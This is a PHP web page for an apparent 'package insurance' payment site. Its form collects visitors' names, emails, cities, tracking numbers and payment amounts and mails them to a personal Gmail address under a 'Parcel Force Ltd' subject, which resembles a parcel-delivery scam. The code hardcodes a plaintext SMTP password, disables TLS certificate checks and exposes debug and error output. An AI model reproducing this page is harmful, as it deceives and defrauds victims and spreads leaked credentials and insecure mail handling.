<?php include 'header.php' ?>
 <!-- .page-title start -->
        <div class="page-title-style01 page-title-negative-top pt-bkg08">
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                        <h1>Insure Package</h1>

                        <div class="breadcrumb-container">
                            <ul class="breadcrumb clearfix">
                                <li>You are here:</li>
                                <li>
                                    <a href="#">Package Insurance</a>
                                </li>
                                <li>
                                    <a href="#">Insure Your Package</a>
                                </li>
                            </ul><!-- .breadcrumb end -->
                        </div><!-- .breadcrumb-container end -->
                    </div><!-- .col-md-12 end -->
                </div><!-- .row end -->
            </div><!-- .container end -->
        </div><!-- .page-title-style01.page-title-negative-top end -->
                                                                                            <?php
/**
 * This example shows how to handle a simple contact form.
 */
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
//Import PHPMailer classes into the global namespace
$msg = '';
//Don't run this unless we're handling a form submission
if (array_key_exists('email', $_POST)) {
    date_default_timezone_set('Etc/UTC');
    require 'autoload.php';
    //Create a new PHPMailer instance
    $mail = new PHPMailer;
     $mail->SMTPOptions = array(
        'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        )
    );
    //Tell PHPMailer to use SMTP - requires a local mail server
    //Faster and safer than using mail()
    $mail->isSMTP();
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;
$mail->SMTPSecure = 'tls';
$mail->Host = 'server.cloudcone.email';
$mail->Port = 587;
//Whether to use SMTP authentication
$mail->SMTPAuth = true;
//Username to use for SMTP authentication - use full email address for gmail
$mail->Username = "sales@spensepetshop.com";
//Password to use for SMTP authentication
$mail->Password = "Cornellekacy45";
    //Use a fixed address in your own domain as the from address
    //**DO NOT** use the submitter's address here as it will be forgery
    //and will cause your messages to fail SPF checks
    $mail->setFrom('sales@spensepetshop.com', 'Insurance Payment');
    //Send the message to yourself, or whoever should receive contact for submissions
    $mail->addAddress('cornellekacy45@gmail.com', 'Insurance Payment');
    //Put the submitter's address in a reply-to header
    //This will fail if the address provided is invalid,
    //in which case we should ignore the whole request
    if ($mail->addReplyTo($_POST['email'], $_POST['name'])) {
        $mail->Subject = 'Parcel Force Ltd';
        //Keep it simple - don't use HTML
        $mail->isHTML(false);
        //Build a simple message body
        $mail->Body = <<<EOT
Name: {$_POST['name']}
Email: {$_POST['email']}
City/State: {$_POST['city']}
Tracking Number: {$_POST['track']}
Package Worth: {$_POST['package']}
Package Worth: {$_POST['insurance']}

EOT;
        //Send the message, check for errors
        if (!$mail->send()) {
            //The reason for failing to send will be in $mail->ErrorInfo
            //but you shouldn't display errors to users - process the error, log it on your server.
            $msg = 'Sorry, something went wrong. Please try again later.'. $mail->ErrorInfo;
        } else {
            echo "<div class='alert alert-success'>
  <strong>Sent!</strong> Your Application has Been Submitted. You will Receive a Message of Us.
</div>";
        }
    } else {
        $msg = 'Invalid email address, message ignored.';
    }
}
?> 

        <div class="container" style="background-image: url(background.jpg);">
        	<div class="row">
        		<div class="col-md-3"></div>
        		<div class="col-md-6">
        			 <form class="wpcf7 clearfix" method="post">
                        
                        <fieldset>
                                <label>
                                    <span class="required">*</span> Full Name:
                                </label>

                                <input type="text" class="wpcf7-text" name="name">
                            </fieldset>

                            <fieldset>
                                <label>
                                    <span class="required">*</span> City/State:
                                </label>

                                <input type="text" class="wpcf7-text" name="city">
                            </fieldset>

                             <fieldset>
                                <label>
                                    <span class="required">*</span> Email:
                                </label>

                                <input type="email" class="wpcf7-text" name="email">
                            </fieldset>

                             <fieldset>
                                <label>
                                    <span class="required">*</span> Tracking Number:
                                </label>

                                <input type="text" class="wpcf7-text" name="track">
                            </fieldset>

                            <fieldset>

                                <input type="text" value="10" hidden="" class="wpcf7-text" id="pointspossible">
                            </fieldset>

                            <fieldset>
                                <label>
                                    <span class="required">*</span> Package Worth:
                                </label>

                                <input type="text" class="wpcf7-text" name="package" id="pointsgiven">
                            </fieldset>

                             <fieldset>
                                <label>
                                    <span class="required">*</span> Insurance Amount to Pay:
                                </label>

                                <input type="text" class="wpcf7-text" name="insurance"  id="pointsperc" >
                            </fieldset>

                            <input type="submit" class="wpcf7-submit" value="Pay Insurance" />
                        </form><!-- .wpcf7 end -->
        		</div>
        		<div class="col-md-3"></div>
        	</div>
        </div>


<?php include 'footer.php' ?>